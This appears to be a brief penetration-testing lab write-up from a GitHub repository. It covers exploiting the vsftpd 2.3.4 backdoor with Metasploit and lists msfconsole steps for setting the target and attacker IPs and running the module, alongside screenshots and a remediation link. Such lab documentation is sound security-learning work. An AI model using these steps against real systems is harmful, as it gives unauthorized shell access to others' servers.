## Exploitation using metasploit 

Service: FTP

Software: vsftpd

Issue: Vulnerable/outdated FTP implementation

Risk: vsftpd v2.3.4 exploit uses a backdoor vulnerability to allow attackers to 
gain unauthorized shell access to systems running this version of the FTP (file transfer Protocol) Server. 

<img width="955" height="500" alt="Screenshot 2026-07-24 150239" src="https://github.com/user-attachments/assets/9c142a95-cc33-4efa-9115-a95bfa8904d7" />

## commands used: 

msfconsole - Launch metasploit 

info - show detailed info about the selected module path 

use <exploit/module path> - select an exploit to use 

show options - display parameters required for the module 

Set RHOST <Targetip> - set the target's ip 

set LHOST <Attackerip> - set the attacker's ip 

 run - execute the selected module 
 
<img width="956" height="494" alt="Screenshot 2026-07-24 151708" src="https://github.com/user-attachments/assets/c899ac29-2aa4-4850-85f2-5febbdf80bcc" />

by using this exploit access can be maintained. 

<img width="1915" height="601" alt="Screenshot 2026-08-20 114910" src="https://github.com/user-attachments/assets/129df17f-e6d4-41e8-a06e-3eb417bc32f8" />
 
## remediation 

[Remediation for FTD Service](remediation/V-01\FTP.md)
